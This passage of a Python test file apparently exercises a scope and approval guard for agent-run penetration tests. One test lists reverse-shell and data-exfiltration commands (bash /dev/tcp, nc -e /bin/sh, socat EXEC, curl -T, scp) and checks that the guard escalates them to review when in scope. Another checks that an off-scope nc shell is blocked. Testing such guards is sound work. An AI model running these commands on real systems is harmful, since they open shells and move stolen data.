        eng_dir=d,
        scope=str(eng / "scope" / "scope.yaml"),
        phase="recon",
        skill_loaded_file=str(skill_file),
        session_id="ts",
        command="nmap -sV 10.10.10.10",
    )
    rc = check_command_enforced(SimpleNamespace(**base))
    assert rc in (0, 2), f"nmap should be allow/review, got {rc}"
    assert sync_state.has_pending_sync(d) is not None, "network tool MUST arm the pending-sync gate"


def test_exfil_channel_is_review_not_block(monkeypatch, tmp_path):
    """Issue 4: Guard-Approved exfil idioms (reverse shell / file transfer) must
    be escalated to REVIEW (exit 2) — NEVER hard-blocked (exit 1). A hard block
    would force the operator to drop to the raw terminal (losing guard coverage)
    to move looted data."""
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    d = str(eng)
    base = dict(
        eng_dir=d,
        scope=str(eng / "scope" / "scope.yaml"),
        phase="exploitation",
        skill_loaded_file=str(skill_file),
        session_id="ts",
    )
    exfil_cmds = [
        "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
        "nc -e /bin/sh 10.10.10.10 4444",
        "socat TCP-LISTEN:4444,fork EXEC:/bin/sh",
        "curl -T loot.txt http://10.10.10.10:8000/",
        "scp loot.txt user@10.10.10.10:/tmp/",
        "python3 -c 'import socket;__import__(\"os\").dup2(socket.socket().fileno(),1)'",
    ]
    for cmd in exfil_cmds:
        rc = check_command_enforced(SimpleNamespace(**{**base, "command": cmd}))
        # REVIEW (2) is allowed-with-approval; hard BLOCK (1) is the failure here.
        assert rc in (0, 2), f"exfil channel should be review not block: {cmd!r} -> {rc}"
        assert rc != 1, f"exfil channel must NOT be hard-blocked: {cmd!r}"


def test_heartbeat_suppressed_during_exploitation(monkeypatch, tmp_path):
    """Issue 2: when phase is EXPLOITATION / POST_EXPLOITATION the periodic
    heartbeat re-read gate must be suppressed, so payload iteration is not
    interrupted mid-flow even after the cadence interval is hit."""
    assert sync_state.heartbeat_suppressed("exploitation") is True
    assert sync_state.heartbeat_suppressed("post_exploitation") is True
    assert sync_state.heartbeat_suppressed("recon") is False
    assert sync_state.heartbeat_suppressed("privesc") is False

    # Even past the cadence interval, exploitation must not arm a heartbeat
    # lock: tick the command counter well past COMMAND_INTERVAL and confirm no
    # heartbeat becomes pending.
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    d = str(eng)
    base = dict(
        eng_dir=d,
        scope=str(eng / "scope" / "scope.yaml"),
        phase="exploitation",
        skill_loaded_file=str(skill_file),
        session_id="ts",
    )
    for _ in range(sync_state.COMMAND_INTERVAL + 2):
        check_command_enforced(SimpleNamespace(**{**base, "command": "nmap -sV 10.10.10.10"}))
    assert sync_state.has_heartbeat_pending(d) is None, (
        "heartbeat must NOT be armed during exploitation"
    )


def test_burst_does_not_arm_heartbeat_during_exploitation(tmp_path):
    """run_burst must respect heartbeat_suppressed(phase) when the cadence trips."""
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    d = str(eng)

    # Put the counter one tick before the cadence boundary so the burst's
    # single post-batch tick reaches COMMAND_INTERVAL.
    for _ in range(sync_state.COMMAND_INTERVAL - 1):
        sync_state.tick_command(d)

    cmds_file = tmp_path / "burst.txt"
    cmds_file.write_text("nmap -sV 10.10.10.10\n", encoding="utf-8")
    rc = cmd_exec_burst(
        SimpleNamespace(
            commands_file=str(cmds_file),
            eng_dir=d,
            phase="exploitation",
            scope=str(eng / "scope" / "scope.yaml"),
            skill_loaded_file=str(skill_file),
            session_id="ts",
            label="x",
        )
    )
    assert rc in (0, 2), f"burst verdict unexpected: {rc}"
    assert sync_state.has_heartbeat_pending(d) is None, (
        "burst must NOT arm a heartbeat during exploitation"
    )


def test_exfil_offscope_is_block_not_guard_approved_review(tmp_path):
    """Off-scope exfil must be denied by scope without a misleading Guard-Approved warning."""
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    res = _check_command_core(
        SimpleNamespace(
            scope=str(eng / "scope" / "scope.yaml"),
            phase="exploitation",
            command="nc -e /bin/sh 8.8.8.8 4444",
            eng_dir="",
            skill_loaded_file="",
            session_id="",
        )
    )
    assert res.exit_code() == 1
    assert any("outside approved scope" in e for e in res.errors)
    assert not any("Guard-Approved" in w for w in res.warnings), res.warnings


def test_artifacts_fresh_whitespace_insensitive(tmp_path):
    """sync-done history continuity should ignore harmless command whitespace drift."""
    eng = tmp_path / "eng"
    (eng / "state").mkdir(parents=True)
    pending = {
        "command": "nmap   -sV   10.10.10.10",
        "phase": "exploitation",
        "ts": "2026-07-10T15:00:30+00:00",
    }
    (eng / "state" / "history.md").write_text(
        "# History\n- [2026-07-10T15:01:00Z] nmap -sV 10.10.10.10\n",
        encoding="utf-8",
    )
    (eng / "state" / "ptt.md").write_text(
        "| PT-040 | [~] | test | -- |\n*Last updated: 2026-07-10 15:01 UTC*\n",
        encoding="utf-8",
    )
    (eng / "hypotheses.md").write_text(
        "### H-001\n- **Updated:** 2026-07-10 15:01 UTC\n",
        encoding="utf-8",
    )
    assert sync_state.artifacts_are_fresh(str(eng), pending) is True


def test_handle_status_consolidated_read(tmp_path):
    """violin_status must return one JSON blob covering bootstrap, skill-load,
    sync credit, pending sync, heartbeat, and counts — without mutating state."""
    import json as _json

    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)

    out = TOOLS.handle_status({"eng_dir": str(eng)})
    j = _json.loads(out)

    # Required top-level keys (consolidates 4 prior read calls).
    for key in (
        "status",
        "bootstrap",
        "skill_loaded",
        "pending_sync",
        "heartbeat_pending",
        "sync_credit_remaining",
        "command_count",
        "message_count",
        "problems",
    ):
        assert key in j, f"violin_status missing {key}"

    # A fully bootstrapped e2e dir with the marker present should report ok.
    assert j["status"] == "ok", j
    assert j["bootstrap"]["ok"] is True, j["bootstrap"]
    assert j["skill_loaded"]["ok"] is True, j["skill_loaded"]

    # Read-only: handle_status must not arm any sync/heartbeat lock.
    import guard.sync as _sync

    assert _sync.has_pending_sync(str(eng)) is None, "status must not mutate sync state"
    assert _sync.has_heartbeat_pending(str(eng)) is None, "status must not mutate heartbeat state"


def test_handle_status_no_eng_dir_is_review_not_crash():
    """Without an eng dir, status reports problems (review) instead of throwing."""
    import json as _json

    out = TOOLS.handle_status({"eng_dir": ""})
    j = _json.loads(out)
    assert j["status"] == "review", j
    assert isinstance(j["problems"], list) and j["problems"]
